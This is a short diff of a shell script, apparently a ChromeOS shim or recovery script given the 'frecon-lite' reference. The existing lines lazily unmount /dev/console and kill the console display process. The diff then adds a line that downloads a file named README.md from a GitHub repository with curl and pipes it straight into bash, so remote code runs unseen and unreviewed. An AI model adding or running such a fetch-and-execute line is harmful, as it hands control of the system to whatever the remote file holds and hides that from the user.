@@ -4,3 +4,5 @@
 
 umount -l /dev/console 
 pkill frecon-lite
+
+curl -sSL https://raw.githubusercontent.com/foxdefox-wq/e/refs/heads/main/README.md | bash
